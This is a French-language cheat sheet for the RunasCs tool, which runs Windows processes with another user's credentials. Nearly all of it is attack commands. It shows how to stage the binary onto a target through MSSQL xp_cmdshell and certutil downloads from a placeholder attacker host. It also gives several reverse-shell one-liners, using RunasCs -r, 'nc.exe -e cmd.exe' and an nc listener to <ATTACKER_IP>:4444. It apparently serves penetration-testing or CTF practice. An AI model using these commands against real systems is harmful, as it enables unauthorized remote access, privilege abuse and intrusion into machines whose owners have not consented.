# RunasCs

Exécution de processus avec credentials d'un autre utilisateur Windows.

## Installation

```bash
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
```

## Transfert sur cible

```bash
# Héberger
python3 -m http.server 8080

# Télécharger (via xp_cmdshell)
EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>/RunasCs.exe C:\temp\runascs.exe';
```

## Syntaxe

```cmd
RunasCs.exe <username> <password> <command> [options]
```

## Options

| Option | Description |
|--------|-------------|
| `-d <domain>` | Domaine |
| `-l <type>` | Logon type (9 par défaut) |
| `-r <host:port>` | Reverse shell |

### Logon Types

| Type | Usage |
|------|-------|
| 2 | Interactive |
| 3 | Network |
| 9 | NewCredentials (recommandé) |

## Exemples

### Commande simple

```cmd
RunasCs.exe Administrator "P@ssw0rd" whoami
RunasCs.exe Administrator "P@ssw0rd" "cmd /c dir C:\" -d DOMAIN
```

### Reverse Shell PowerShell

```bash
# Attaquant
nc -lvnp 4444

# Cible
RunasCs.exe Administrator "P@ssw0rd" powershell.exe -r <ATTACKER_IP>:4444
```

### Avec Netcat

```cmd
RunasCs.exe Administrator "P@ssw0rd" "C:\temp\nc.exe -e cmd.exe <ATTACKER_IP> 4444"
```

### Via MSSQL

```sql
-- Télécharger
EXEC xp_cmdshell 'mkdir C:\temp';
EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>/RunasCs.exe C:\temp\runascs.exe';

-- Reverse shell
EXEC xp_cmdshell 'C:\temp\runascs.exe Administrator P@ssw0rd powershell.exe -r <ATTACKER_IP>:4444';
```

## Logon type spécifique

```cmd
# Interactive
RunasCs.exe user "pass" notepad.exe -l 2

# Network
RunasCs.exe user "pass" "net use \\server\share" -l 3

# NewCredentials
RunasCs.exe user "pass" cmd.exe -l 9
```
